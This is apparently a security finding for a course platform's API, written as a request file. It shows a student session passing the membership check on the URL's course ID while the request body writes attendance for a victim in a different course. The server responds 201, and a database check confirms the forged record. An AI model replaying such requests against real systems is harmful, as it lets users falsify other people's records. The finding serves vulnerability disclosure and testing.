### VULN-020 — Attendance forgery: authorize on PATH :courseId, mutate on BODY courseId/lessonId/studentId
### <S> is the session of a STUDENT who is a member of course A only (satisfies courseMemberMiddleware
### on the PATH course A). The BODY targets a DIFFERENT course B + a victim's groupmember id.

POST http://localhost:21527/course/eb4c14aa-4bf0-4455-a9d9-c5d4325803c2/attendance HTTP/1.1
Host: localhost:21527
Origin: http://localhost:21526
cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
Cookie: classroomio.session_token=<S>
Content-Type: application/json

{
  "courseId": "78857e0e-a826-4cad-b0c2-dbc0a66811d7",
  "lessonId": "adda7077-6c7b-4ac1-a763-08d1215ee819",
  "studentId": "deb72664-1a2c-46ee-ad43-e7b6b5882436",
  "isPresent": false
}

### Response: HTTP 201
### { "success": true, "data": { "id": 1, "courseId": "78857e0e-...(course B)",
###     "studentId": "deb72664-...(victim groupmember)", "isPresent": false, ... } }
###
### group_attendance.student_id is a FK to groupmember.id; lesson_id has NO FK (any uuid accepted).
### Ground truth (psql): a group_attendance row now exists for (course B, victim groupmember, lesson)
### written by an actor who has no role in course B.
